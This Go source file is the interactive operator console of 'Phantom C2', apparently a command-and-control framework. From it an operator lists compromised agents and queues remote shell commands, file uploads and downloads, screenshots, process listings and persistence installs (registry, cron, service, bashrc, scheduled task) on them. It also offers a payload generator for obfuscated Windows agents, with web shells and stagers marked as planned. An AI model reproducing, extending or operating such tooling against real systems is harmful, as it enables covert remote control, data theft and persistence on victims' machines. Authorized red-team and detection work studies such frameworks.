package cli

import (
	"bufio"
	"fmt"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/phantom-c2/phantom/internal/db"
	"github.com/phantom-c2/phantom/internal/protocol"
	"github.com/phantom-c2/phantom/internal/server"
	"github.com/phantom-c2/phantom/internal/util"
)

// Shell is the interactive CLI shell for Phantom.
type Shell struct {
	server      *server.Server
	scanner     *bufio.Scanner
	activeAgent *db.Agent // currently interacting agent
	running     bool
}

// NewShell creates a new CLI shell.
func NewShell(srv *server.Server) *Shell {
	return &Shell{
		server:  srv,
		scanner: bufio.NewScanner(os.Stdin),
		running: true,
	}
}

// Run starts the interactive shell loop.
func (sh *Shell) Run() {
	// Handle Ctrl+C gracefully
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println()
		Info("Shutting down...")
		sh.server.Shutdown()
		os.Exit(0)
	}()

	// Register event handler for live notifications
	sh.server.OnEvent = sh.onEvent

	for sh.running {
		sh.printPrompt()

		if !sh.scanner.Scan() {
			break
		}

		line := strings.TrimSpace(sh.scanner.Text())
		if line == "" {
			continue
		}

		sh.execute(line)
	}
}

// printPrompt displays the CLI prompt.
func (sh *Shell) printPrompt() {
	if sh.activeAgent != nil {
		fmt.Printf("\n  %sphantom%s [%s%s%s] > ", colorPurple, colorReset, colorCyan, sh.activeAgent.Name, colorReset)
	} else {
		fmt.Printf("\n  %sphantom%s > ", colorPurple, colorReset)
	}
}

// execute dispatches a command.
func (sh *Shell) execute(line string) {
	parts := strings.Fields(line)
	if len(parts) == 0 {
		return
	}

	cmd := strings.ToLower(parts[0])
	args := parts[1:]

	// If interacting with an agent, handle agent commands
	if sh.activeAgent != nil {
		sh.executeAgentCmd(cmd, args)
		return
	}

	// Global commands
	switch cmd {
	case "help", "?":
		sh.cmdHelp()
	case "agents", "sessions":
		sh.cmdAgents()
	case "interact", "use":
		sh.cmdInteract(args)
	case "listeners":
		sh.cmdListeners(args)
	case "tasks":
		sh.cmdTasks(args)
	case "generate", "payload":
		sh.cmdGenerate(args)
	case "events", "log":
		sh.cmdEvents()
	case "clear", "cls":
		fmt.Print("\033[H\033[2J")
	case "exit", "quit":
		Info("Shutting down...")
		sh.server.Shutdown()
		sh.running = false
	default:
		Error("Unknown command: %s (type 'help' for available commands)", cmd)
	}
}

// executeAgentCmd handles commands within an agent interaction.
func (sh *Shell) executeAgentCmd(cmd string, args []string) {
	switch cmd {
	case "help", "?":
		sh.cmdAgentHelp()
	case "back", "bg", "exit":
		Info("Returning to main menu")
		sh.activeAgent = nil
	case "info":
		sh.cmdAgentInfo()
	case "shell", "exec", "cmd":
		sh.cmdShell(args)
	case "upload":
		sh.cmdUpload(args)
	case "download":
		sh.cmdDownload(args)
	case "screenshot":
		sh.cmdScreenshot()
	case "ps":
		sh.cmdProcessList()
	case "sysinfo":
		sh.cmdSysinfo()
	case "persist":
		sh.cmdPersist(args)
	case "sleep":
		sh.cmdSleep(args)
	case "cd":
		sh.cmdCd(args)
	case "kill":
		sh.cmdKill()
	case "tasks":
		sh.cmdAgentTasks()
	default:
		// Treat as shell command
		sh.cmdShell(append([]string{cmd}, args...))
	}
}

// ─────────────── Global Commands ───────────────

func (sh *Shell) cmdHelp() {
	fmt.Println()
	fmt.Printf("  %s%sPhantom C2 — Commands%s\n", colorBold, colorPurple, colorReset)
	fmt.Printf("  %s─────────────────────────────────────────%s\n", colorDim, colorReset)
	fmt.Println()

	cmds := [][]string{
		{"agents", "List all connected agents"},
		{"interact <name|id>", "Interact with an agent"},
		{"listeners [start|stop] <name>", "Manage listeners"},
		{"tasks [agent]", "View task history"},
		{"generate", "Generate agent payloads"},
		{"events", "View event log"},
		{"clear", "Clear screen"},
		{"help", "Show this help"},
		{"exit", "Shutdown and exit"},
	}

	for _, c := range cmds {
		fmt.Printf("  %s%-30s%s %s%s%s\n", colorCyan, c[0], colorReset, colorDim, c[1], colorReset)
	}
	fmt.Println()
}

func (sh *Shell) cmdAgents() {
	agents, err := sh.server.AgentMgr.List()
	if err != nil {
		Error("Failed to list agents: %v", err)
		return
	}

	if len(agents) == 0 {
		Warn("No agents connected")
		return
	}

	// Refresh statuses
	sh.server.AgentMgr.RefreshStatuses()
	agents, _ = sh.server.AgentMgr.List()

	t := NewTable("ID", "Name", "OS", "Hostname", "User", "IP", "Sleep", "Last Seen", "Status")
	for _, a := range agents {
		t.AddRow(
			util.ShortID(a.ID),
			a.Name,
			a.OS,
			a.Hostname,
			a.Username,
			a.ExternalIP,
			fmt.Sprintf("%ds/%d%%", a.Sleep, a.Jitter),
			util.TimeAgo(a.LastSeen),
			a.Status,
		)
	}
	fmt.Println()
	t.Render()
}

func (sh *Shell) cmdInteract(args []string) {
	if len(args) == 0 {
		Error("Usage: interact <agent-name|agent-id>")
		return
	}

	agent, err := sh.server.AgentMgr.Get(args[0])
	if err != nil {
		Error("Error: %v", err)
		return
	}
	if agent == nil {
		Error("Agent not found: %s", args[0])
		return
	}

	sh.activeAgent = agent
	Success("Interacting with %s (%s@%s)", agent.Name, agent.Username, agent.Hostname)
}

func (sh *Shell) cmdListeners(args []string) {
	if len(args) == 0 {
		// List all listeners
		listeners := sh.server.ListenerMgr.List()
		if len(listeners) == 0 {
			Warn("No listeners configured")
			return
		}

		t := NewTable("Name", "Type", "Bind Address", "Status")
		for _, l := range listeners {
			status := "stopped"
			if l.IsRunning() {
				status = "running"
			}
			t.AddRow(l.Name, strings.ToUpper(l.Type), l.BindAddr, status)
		}
		fmt.Println()
		t.Render()
		return
	}

	action := strings.ToLower(args[0])
	switch action {
	case "start":
		if len(args) < 2 {
			Error("Usage: listeners start <name>")
			return
		}
		if err := sh.server.StartListener(args[1]); err != nil {
			Error("Failed to start listener: %v", err)
		} else {
			Success("Listener %s started", args[1])
		}
	case "stop":
		if len(args) < 2 {
			Error("Usage: listeners stop <name>")
			return
		}
		if err := sh.server.StopListener(args[1]); err != nil {
			Error("Failed to stop listener: %v", err)
		} else {
			Success("Listener %s stopped", args[1])
		}
	default:
		Error("Unknown action: %s (use: start, stop)", action)
	}
}

func (sh *Shell) cmdTasks(args []string) {
	agentID := ""
	if len(args) > 0 {
		a, err := sh.server.AgentMgr.Get(args[0])
		if err != nil || a == nil {
			Error("Agent not found: %s", args[0])
			return
		}
		agentID = a.ID
	}

	var allTasks []*db.TaskRecord
	if agentID != "" {
		tasks, err := sh.server.TaskDisp.GetTaskHistory(agentID)
		if err != nil {
			Error("Failed to get tasks: %v", err)
			return
		}
		allTasks = tasks
	} else {
		// Get tasks for all agents
		agents, _ := sh.server.AgentMgr.List()
		for _, a := range agents {
			tasks, _ := sh.server.TaskDisp.GetTaskHistory(a.ID)
			allTasks = append(allTasks, tasks...)
		}
	}

	if len(allTasks) == 0 {
		Warn("No tasks found")
		return
	}

	t := NewTable("ID", "Agent", "Type", "Args", "Status", "Created")
	for _, task := range allTasks {
		agentName := util.ShortID(task.AgentID)
		a, _ := sh.server.AgentMgr.Get(task.AgentID)
		if a != nil {
			agentName = a.Name
		}

		argsStr := strings.Join(task.Args, " ")
		if len(argsStr) > 30 {
			argsStr = argsStr[:27] + "..."
		}

		t.AddRow(
			util.ShortID(task.ID),
			agentName,
			protocol.TaskTypeName(uint8(task.Type)),
			argsStr,
			protocol.StatusName(uint8(task.Status)),
			util.TimeAgo(task.CreatedAt),
		)
	}
	fmt.Println()
	t.Render()
}

func (sh *Shell) cmdGenerate(args []string) {
	fmt.Println()
	fmt.Printf("  %s%sPayload Generator%s\n", colorBold, colorPurple, colorReset)
	fmt.Printf("  %s─────────────────────────────────────────%s\n", colorDim, colorReset)
	fmt.Println()

	types := [][]string{
		{"1", "Windows EXE (amd64)", "make agent-windows"},
		{"2", "Linux Binary (amd64)", "make agent-linux"},
		{"3", "Windows EXE Obfuscated", "make agent-garble-windows"},
		{"4", "Web Shell (ASPX)", "Coming soon"},
		{"5", "Web Shell (PHP)", "Coming soon"},
		{"6", "Web Shell (JSP)", "Coming soon"},
		{"7", "PowerShell Stager", "Coming soon"},
		{"8", "Bash Stager", "Coming soon"},
	}

	for _, t := range types {
		fmt.Printf("  %s[%s]%s %-28s %s%s%s\n", colorCyan, t[0], colorReset, t[1], colorDim, t[2], colorReset)
	}
	fmt.Println()
	Info("Use 'make agent-windows LISTENER_URL=<url> SLEEP=10 JITTER=20' to build")
}

func (sh *Shell) cmdEvents() {
	if len(sh.server.EventLog) == 0 {
		Warn("No events recorded")
		return
	}

	fmt.Println()
	for _, e := range sh.server.EventLog {
		fmt.Printf("  %s%s%s\n", colorDim, e, colorReset)
	}
}

// ─────────────── Agent Commands ───────────────

func (sh *Shell) cmdAgentHelp() {
	fmt.Println()
	fmt.Printf("  %s%sAgent Commands — %s%s\n", colorBold, colorCyan, sh.activeAgent.Name, colorReset)
	fmt.Printf("  %s─────────────────────────────────────────%s\n", colorDim, colorReset)
	fmt.Println()

	cmds := [][]string{
		{"shell <command>", "Execute a shell command"},
		{"upload <local> <remote>", "Upload file to agent"},
		{"download <remote>", "Download file from agent"},
		{"screenshot", "Capture screenshot"},
		{"ps", "List running processes"},
		{"sysinfo", "Get system information"},
		{"persist <method>", "Install persistence (registry|cron|service)"},
		{"sleep <sec> [jitter%]", "Change sleep interval"},
		{"cd <path>", "Change working directory"},
		{"kill", "Terminate the agent"},
		{"info", "Show agent details"},
		{"tasks", "Show task history for this agent"},
		{"back", "Return to main menu"},
	}

	for _, c := range cmds {
		fmt.Printf("  %s%-28s%s %s%s%s\n", colorCyan, c[0], colorReset, colorDim, c[1], colorReset)
	}
	fmt.Println()
}

func (sh *Shell) cmdAgentInfo() {
	a := sh.activeAgent
	fmt.Println()
	fmt.Printf("  %s%sAgent: %s%s\n", colorBold, colorCyan, a.Name, colorReset)
	fmt.Printf("  %s─────────────────────────────────────────%s\n", colorDim, colorReset)
	fmt.Printf("  %-15s %s\n", "ID:", a.ID)
	fmt.Printf("  %-15s %s\n", "Name:", a.Name)
	fmt.Printf("  %-15s %s\n", "Hostname:", a.Hostname)
	fmt.Printf("  %-15s %s\n", "Username:", a.Username)
	fmt.Printf("  %-15s %s / %s\n", "OS/Arch:", a.OS, a.Arch)
	fmt.Printf("  %-15s %d (%s)\n", "PID:", a.PID, a.ProcessName)
	fmt.Printf("  %-15s %s\n", "Internal IP:", a.InternalIP)
	fmt.Printf("  %-15s %s\n", "External IP:", a.ExternalIP)
	fmt.Printf("  %-15s %ds / %d%% jitter\n", "Sleep:", a.Sleep, a.Jitter)
	fmt.Printf("  %-15s %s\n", "First Seen:", util.FormatTimestamp(a.FirstSeen))
	fmt.Printf("  %-15s %s (%s)\n", "Last Seen:", util.FormatTimestamp(a.LastSeen), util.TimeAgo(a.LastSeen))
	fmt.Printf("  %-15s %s\n", "Status:", a.Status)
	fmt.Println()
}

func (sh *Shell) queueTask(taskType uint8, args []string, data []byte) {
	task, err := sh.server.TaskDisp.CreateTask(sh.activeAgent.ID, taskType, args, data)
	if err != nil {
		Error("Failed to create task: %v", err)
		return
	}
	Success("Task queued (ID: %s) — waiting for agent check-in...", util.ShortID(task.ID))
}

func (sh *Shell) cmdShell(args []string) {
	if len(args) == 0 {
		Error("Usage: shell <command>")
		return
	}
	sh.queueTask(protocol.TaskShell, args, nil)
}

func (sh *Shell) cmdUpload(args []string) {
	if len(args) < 2 {
		Error("Usage: upload <local-path> <remote-path>")
		return
	}

	data, err := os.ReadFile(args[0])
	if err != nil {
		Error("Failed to read file: %v", err)
		return
	}

	sh.queueTask(protocol.TaskUpload, []string{args[1]}, data)
	Info("File size: %d bytes", len(data))
}

func (sh *Shell) cmdDownload(args []string) {
	if len(args) == 0 {
		Error("Usage: download <remote-path>")
		return
	}
	sh.queueTask(protocol.TaskDownload, args, nil)
}

func (sh *Shell) cmdScreenshot() {
	sh.queueTask(protocol.TaskScreenshot, nil, nil)
}

func (sh *Shell) cmdProcessList() {
	sh.queueTask(protocol.TaskProcessList, nil, nil)
}

func (sh *Shell) cmdSysinfo() {
	sh.queueTask(protocol.TaskSysinfo, nil, nil)
}

func (sh *Shell) cmdPersist(args []string) {
	if len(args) == 0 {
		Error("Usage: persist <method>")
		Info("Methods: registry, cron, service, bashrc, schtask")
		return
	}
	sh.queueTask(protocol.TaskPersist, args, nil)
}

func (sh *Shell) cmdSleep(args []string) {
	if len(args) == 0 {
		Error("Usage: sleep <seconds> [jitter%%]")
		return
	}

	sleep, err := strconv.Atoi(args[0])
	if err != nil || sleep < 1 {
		Error("Invalid sleep value")
		return
	}

	jitter := sh.activeAgent.Jitter
	if len(args) > 1 {
		j, err := strconv.Atoi(args[1])
		if err == nil && j >= 0 && j <= 50 {
			jitter = j
		}
	}

	sh.server.AgentMgr.UpdateSleep(sh.activeAgent.ID, sleep, jitter)
	sh.queueTask(protocol.TaskSleep, []string{args[0], strconv.Itoa(jitter)}, nil)
	Success("Sleep set to %ds with %d%% jitter", sleep, jitter)
}

func (sh *Shell) cmdCd(args []string) {
	if len(args) == 0 {
		Error("Usage: cd <path>")
		return
	}
	sh.queueTask(protocol.TaskCd, args, nil)
}

func (sh *Shell) cmdKill() {
	Warn("This will terminate the agent. Are you sure? (y/N): ")
	if sh.scanner.Scan() {
		if strings.ToLower(strings.TrimSpace(sh.scanner.Text())) == "y" {
			sh.queueTask(protocol.TaskKill, nil, nil)
			Warn("Kill task queued — agent will terminate on next check-in")
			sh.activeAgent = nil
		}
	}
}

func (sh *Shell) cmdAgentTasks() {
	tasks, err := sh.server.TaskDisp.GetTaskHistory(sh.activeAgent.ID)
	if err != nil {
		Error("Failed to get tasks: %v", err)
		return
	}

	if len(tasks) == 0 {
		Warn("No tasks for this agent")
		return
	}

	t := NewTable("ID", "Type", "Args", "Status", "Created")
	for _, task := range tasks {
		argsStr := strings.Join(task.Args, " ")
		if len(argsStr) > 35 {
			argsStr = argsStr[:32] + "..."
		}

		t.AddRow(
			util.ShortID(task.ID),
			protocol.TaskTypeName(uint8(task.Type)),
			argsStr,
			protocol.StatusName(uint8(task.Status)),
			util.TimeAgo(task.CreatedAt),
		)
	}
	fmt.Println()
	t.Render()

	// Show latest result if available
	if len(tasks) > 0 && tasks[0].Status == int(protocol.StatusComplete) {
		result, _ := sh.server.TaskDisp.GetResult(tasks[0].ID)
		if result != nil && len(result.Output) > 0 {
			fmt.Printf("\n  %sLatest result:%s\n", colorDim, colorReset)
			fmt.Printf("  %s\n", string(result.Output))
		}
	}
}

// onEvent handles real-time events from the server.
func (sh *Shell) onEvent(event string, args ...interface{}) {
	timestamp := time.Now().Format("15:04:05")

	switch event {
	case "agent_register":
		fmt.Printf("\r  %s[%s]%s %s%s New agent: %v%s\n", colorGreen, timestamp, colorReset, colorBold, colorGreen, args, colorReset)
		sh.printPrompt()
	case "task_result":
		fmt.Printf("\r  %s[%s]%s Task result received from %v\n", colorCyan, timestamp, colorReset, args[0])
		sh.printPrompt()
	case "listener_start":
		fmt.Printf("\r  %s[%s]%s Listener %v started (%v on %v)\n", colorGreen, timestamp, colorReset, args[0], args[1], args[2])
	case "listener_stop":
		fmt.Printf("\r  %s[%s]%s Listener %v stopped\n", colorYellow, timestamp, colorReset, args[0])
	case "listener_error":
		fmt.Printf("\r  %s[%s]%s %sListener %v error: %v%s\n", colorRed, timestamp, colorReset, colorRed, args[0], args[1], colorReset)
	}
}
